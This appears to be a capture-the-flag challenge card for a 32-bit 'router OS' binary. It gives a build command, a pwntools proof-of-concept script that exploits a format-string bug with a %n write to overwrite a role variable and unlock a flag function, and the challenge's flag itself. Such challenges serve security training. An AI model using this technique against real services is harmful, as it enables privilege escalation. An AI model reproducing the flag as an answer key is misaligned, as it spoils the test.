# hutchYyOS-0.1alpha

## Category

Exploit

## Estimated difficulty

Hard

## Description

COntestant have to exploit a format string to overwrite a role in the application, once the role is overwritted they have access to a super function that give them the flag.

Build with;

```
gcc -m32 hutchYyOS.c -o hutchYyOS -lssl -lcrypto -fstack-protector-all
```

## Scenario

For F U N, I just started to create my own router OS.
Sounds fun huh?!

I really just started and I wanted to have a first security review.

Let me know if you find something weird.

## Write-up

See poc script

## PoC script

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 5000
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './pwnstation'

def send_payload(payload):
    io.recvuntil(b"Ro> ")
    io.sendline(b"3")
    io.recvuntil(b"addr: ")
    addr = io.recvline().decode().rstrip().encode()
    io.recvuntil(b"Username: ")
    io.sendline(payload)
    io.recvuntil(b": ")
    io.sendline(b"randompass")
    r = io.recvline()
    return r

def get_var_addr()->str:
    io.recvuntil(b"Ro> ")
    io.sendline(b"3")
    io.recvuntil(b"addr: ")
    addr = io.recvline().decode().rstrip().encode()
    io.recvuntil(b"Username: ")
    io.sendline(b"randomuser")
    io.recvuntil(b": ")
    io.sendline(b"randompass")
    io.recvline()
    return addr

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 5000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()


fmtoffset = FmtStr(execute_fmt=send_payload).offset
var_addr = int(get_var_addr().decode(), 16)
padding = "AAAA"+"%97"+"x"+"%10"+"x"
offset = f"%{fmtoffset+3}$n".encode()
send_payload(padding.encode()+p32(var_addr)+offset)
io.recvuntil(b"Ro> ")
io.sendline(b"4")
flag = io.recv()
log.success(flag)
#io.interactive()

```

## Flag

CSC{sUp3r_f0rm4t_str1ngs!!}

## Creator

Julian Dotreppe

## Creator bio

-
